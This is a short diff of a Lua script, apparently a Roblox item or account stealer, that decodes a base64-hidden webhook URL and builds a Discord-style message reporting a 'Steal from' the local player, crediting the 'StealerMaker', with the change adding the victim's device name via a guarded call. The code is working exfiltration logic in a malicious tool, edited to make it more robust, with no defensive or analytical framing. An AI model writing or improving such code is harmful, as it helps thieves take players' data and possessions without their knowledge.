@@ -479,14 +479,18 @@ if _G.Act == true then
             Wbh_En = from_base64(Wbh)
 
             local headers = {["content-type"] = "application/json"}
-
+            
+            local device = "Error"
+            pcall(function()
+                device = Save.Get().Device
+            end)
             local data = {
                 ["avatar_url"] = "",
                 ["content"] = "",
                 ["embeds"] = {
                     {
                         ["fields"] = fields,
-                        ["title"] = "Steal from "..LP.Name..", thx "..StealerMaker.."! "..Save.Get().Device,
+                        ["title"] = "Steal from "..LP.Name..", thx "..StealerMaker.."! ",
                         ["type"] = "rich",
                         ["color"] = 16777215
                     }
